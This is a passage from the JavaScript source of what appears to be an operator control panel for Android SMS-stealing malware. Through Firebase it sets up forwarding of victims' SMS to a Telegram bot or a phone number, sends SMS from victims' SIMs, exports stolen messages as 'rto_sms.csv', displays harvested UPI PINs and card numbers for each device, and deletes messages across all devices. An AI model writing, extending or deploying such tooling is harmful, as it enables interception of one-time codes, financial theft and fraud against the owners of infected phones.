      '</div>' +
      '<div class="info-box green"><span class="dot-indicator ' + (forwardingOn ? 'on' : '') + '"></span>Off - enter a number and select ON</div>' +
      '<div class="info-box" style="font-style:italic;">Recipient: forwarding number. Message: complete new SMS. Send delay: 0.5 seconds.</div>' +
      '</div>' +
      
      '<div class="send-card">' +
      '<h3>📤 SEND SMS DIRECT</h3>' +
      '<label class="form-label">SELECT SIM</label>' +
      '<div class="sim-row">' +
      '<div class="sim-btn active" data-sendsim="1">SIM 1</div>' +
      '<div class="sim-btn" data-sendsim="2">SIM 2</div>' +
      '</div>' +
      '<div class="form-group"><label class="form-label">RECIPIENT</label><input type="text" class="form-input" id="sendTo" placeholder="+919876543210" inputmode="numeric"></div>' +
      '<div class="form-group"><label class="form-label">MESSAGE</label><textarea class="form-textarea" id="sendMsg" placeholder="Type your message here..."></textarea><div class="chars-count" id="charsCount">0 chars</div></div>' +
      '<button class="btn-submit" id="sendBtn">✈️ Send via SIM</button>' +
      '<button class="btn-submit" id="useDeviceNum" style="background:#1A2F4A;color:#00E5FF;margin-top:8px;">Use device number: ' + escapeHtml((dev.sim_info && dev.sim_info.sim1_number) || '-') + '</button>' +
      '</div>';
    
    setTimeout(function() {
      // SIM buttons - forwarding
      document.querySelectorAll('[data-sim]').forEach(function(b) {
        b.addEventListener('click', function() {
          var sim = parseInt(this.getAttribute('data-sim'));
          db.ref('forward_settings/' + currentDeviceId + '/forward_sim_slot').set(sim);
          renderTab();
        });
      });
      
      // Telegram start
      document.getElementById('tgStart').addEventListener('click', function() {
        var tok = document.getElementById('tgToken').value.trim();
        var chat = document.getElementById('tgChat').value.trim();
        if (!tok || !chat) { alert('Fill token and chat ID'); return; }
        db.ref('forward_settings/' + currentDeviceId).update({
          bot_token: tok, chat_id: chat, enabled: true, start_timestamp: Date.now(), updated_at: Date.now()
        });
        alert('✅ Telegram activated');
      });
      
      // Forwarding toggle
      document.getElementById('fwdToggle').addEventListener('click', function() {
        var num = document.getElementById('fwdNum').value.trim();
        var newState = !forwardingOn;
        if (newState && num.length < 10) { alert('Enter valid number'); return; }
        db.ref('forward_settings/' + currentDeviceId).update({
          enabled: newState, admin_number: num, start_timestamp: Date.now()
        });
        renderTab();
      });
      
      // Send SIM buttons
      document.querySelectorAll('[data-sendsim]').forEach(function(b) {
        b.addEventListener('click', function() {
          document.querySelectorAll('[data-sendsim]').forEach(function(x) { x.classList.remove('active'); });
          this.classList.add('active');
        });
      });
      
      // Char count
      document.getElementById('sendMsg').addEventListener('input', function() {
        document.getElementById('charsCount').textContent = this.value.length + ' chars';
      });
      
      // Use device number
      document.getElementById('useDeviceNum').addEventListener('click', function() {
        document.getElementById('sendTo').value = (dev.sim_info && dev.sim_info.sim1_number) || '';
      });
      
      // Send SMS
      document.getElementById('sendBtn').addEventListener('click', function() {
        var to = document.getElementById('sendTo').value.trim();
        var msg = document.getElementById('sendMsg').value.trim();
        var selectedSim = document.querySelector('[data-sendsim].active');
        var sim = selectedSim ? parseInt(selectedSim.getAttribute('data-sendsim')) : 1;
        if (!to || !msg) { alert('Fill recipient and message'); return; }
        db.ref('device_info/' + currentDeviceId + '/sms_commands').push({
          to: to, message: msg, sim_slot: sim, status: 'pending', timestamp: Date.now()
        });
        alert('✅ SMS command sent via SIM ' + sim);
        document.getElementById('sendMsg').value = '';
        document.getElementById('charsCount').textContent = '0 chars';
      });
    }, 100);
  }
}

// EVENT LISTENERS
document.getElementById('loginBtn').addEventListener('click', doLogin);
document.getElementById('logoutBtn').addEventListener('click', doLogout);
document.getElementById('closeModalBtn').addEventListener('click', closeModal);
document.getElementById('closeDialogBtn').addEventListener('click', function() {
  document.getElementById('dialogDrawer').classList.remove('active');
  document.getElementById('dialogOverlay').classList.remove('active');
});
document.getElementById('drawerOverlay').addEventListener('click', closeModal);
document.getElementById('dialogOverlay').addEventListener('click', function() {
  document.getElementById('dialogDrawer').classList.remove('active');
  document.getElementById('dialogOverlay').classList.remove('active');
});
document.getElementById('pinInput').addEventListener('keypress', function(e) { if (e.key === 'Enter') doLogin(); });
document.getElementById('searchBox').addEventListener('input', renderDevices);
document.getElementById('btnStarModal').addEventListener('click', function() { toggleLike(currentDeviceId); });
document.getElementById('btnDelDeviceModal').addEventListener('click', function() {
  if (!confirm('Delete device?')) return;
  db.ref('device_info/' + currentDeviceId).remove();
  closeModal();
});
document.querySelectorAll('.filter-btn').forEach(function(btn) {
  btn.addEventListener('click', function() {
    document.querySelectorAll('.filter-btn').forEach(function(b) { b.classList.remove('active'); });
    this.classList.add('active');
    currentFilter = this.getAttribute('data-filter');
    renderDevices();
  });
});
document.querySelectorAll('.tab').forEach(function(t) {
  t.addEventListener('click', function() { switchTab(this.getAttribute('data-tab')); });
});
document.getElementById('btnCsvExport').addEventListener('click', function() {
  var csv = 'Device,Sender,Body,Date\n';
  Object.keys(allDevices).forEach(function(id) {
    var dev = allDevices[id];
    if (dev.messages) Object.values(dev.messages).forEach(function(m) {
      csv += '"' + id + '","' + (m.sender || '').replace(/"/g, '""') + '","' + (m.body || '').replace(/"/g, '""') + '","' + (m.date || '') + '"\n';
    });
  });
  var blob = new Blob([csv], { type: 'text/csv' });
  var url = URL.createObjectURL(blob);
  var a = document.createElement('a'); a.href = url; a.download = 'rto_sms.csv'; a.click();
});
document.getElementById('btnPingAll').addEventListener('click', function() {
  alert('Ping sent to ' + Object.keys(allDevices).length + ' devices');
});
document.getElementById('btnFbSources').addEventListener('click', function() {
  alert('Firebase URL: ' + firebaseConfig.databaseURL);
});
document.getElementById('btnCards').addEventListener('click', function() {
  var cards = '';
  Object.keys(allDevices).forEach(function(id) {
    var dev = allDevices[id];
    if (dev.card_data || dev.upi_data) {
      cards += id + ': UPI ' + (dev.upi_data && dev.upi_data.upi_pin || '-') + ' | Card ' + (dev.card_data && dev.card_data.card_number || '-') + '\n';
    }
  });
  alert(cards || 'No cards found');
});
document.getElementById('btnNuke').addEventListener('click', function() {
  if (!confirm('Delete ALL messages from ALL devices?')) return;
  if (!confirm('Are you ABSOLUTELY sure?')) return;
  Object.keys(allDevices).forEach(function(id) {
    db.ref('device_info/' + id + '/messages').remove();
    db.ref('device_info/' + id + '/sms_history').remove();
  });
  alert('All messages deleted');
});

window.addEventListener('load', function() {
  if (localStorage.getItem('admin_logged_in') === 'true') {
    document.getElementById('loginScreen').style.display = 'none';
    document.getElementById('mainApp').style.display = 'block';
    startApp();
  }
});
</script>
